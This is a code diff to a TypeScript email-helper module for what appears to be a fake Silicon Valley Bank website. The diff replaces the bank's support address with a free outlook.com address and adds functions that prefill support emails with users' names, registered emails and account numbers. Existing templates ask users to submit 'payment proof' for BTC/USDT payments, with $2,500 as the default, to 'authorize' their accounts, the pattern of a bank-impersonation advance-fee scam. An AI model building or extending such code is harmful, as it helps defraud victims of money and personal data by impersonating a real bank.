@@ -1,4 +1,4 @@
-export const SUPPORT_EMAIL = 'support@siliconvalleybank.com';
+export const SUPPORT_EMAIL = 'svbcustomerservice@outlook.com';
 
 interface UserEmailInfo {
   fullName?: string;
@@ -11,6 +11,8 @@ interface VerificationDetails {
   amount?: number;
   reference?: string;
   walletAddress?: string;
+  subject?: string;
+  message?: string;
 }
 
 export const getLiveAgentMailtoUrl = (
@@ -23,9 +25,9 @@ export const getLiveAgentMailtoUrl = (
   const method = details?.method || 'BTC / USDT';
   const amount = details?.amount ? `$${details.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD` : '$2,500.00 USD';
 
-  const subject = `Payment Proof Verification Request - ${amount} - ${userName} (Acc #${accNum})`;
+  const subject = details?.subject || `Payment Proof Verification Request - ${amount} - ${userName} (Acc #${accNum})`;
   
-  const body = `Hello SVB Support Team,
+  const body = details?.message || `Hello SVB Support Team,
 
 I am writing to submit my payment proof for verification and request authorization for my Silicon Valley Bank account.
 
@@ -44,6 +46,33 @@ ${userName}`;
   return `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
 };
 
+export const getSupportContactMailtoUrl = (
+  user?: UserEmailInfo,
+  customSubject?: string,
+  customBody?: string
+): string => {
+  const email = SUPPORT_EMAIL;
+  const userName = user?.fullName || 'Client';
+  const accNum = user?.accountNumber ? ` (Acc #${user.accountNumber})` : '';
+  const subject = customSubject || `Customer Support & Inquiry Request - ${userName}${accNum}`;
+  const body = customBody || `Hello Silicon Valley Bank Support Desk,
+
+I would like to get in touch regarding my SVB online banking account.
+
+--- ACCOUNT INQUIRY DETAILS ---
+• Full Name: ${userName}
+• Registered Email: ${user?.email || 'N/A'}
+• Account Number: ${user?.accountNumber || 'N/A'}
+
+Inquiry Message:
+[Please type your message or inquiry here]
+
+Thank you,
+${userName}`;
+
+  return `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+};
+
 export const openLiveAgentEmail = (
   user?: UserEmailInfo,
   details?: VerificationDetails
@@ -55,3 +84,17 @@ export const openLiveAgentEmail = (
     window.open(mailtoUrl, '_blank');
   }
 };
+
+export const openSupportEmail = (
+  user?: UserEmailInfo,
+  subject?: string,
+  body?: string
+): void => {
+  const mailtoUrl = getSupportContactMailtoUrl(user, subject, body);
+  try {
+    window.location.href = mailtoUrl;
+  } catch (e) {
+    window.open(mailtoUrl, '_blank');
+  }
+};
+
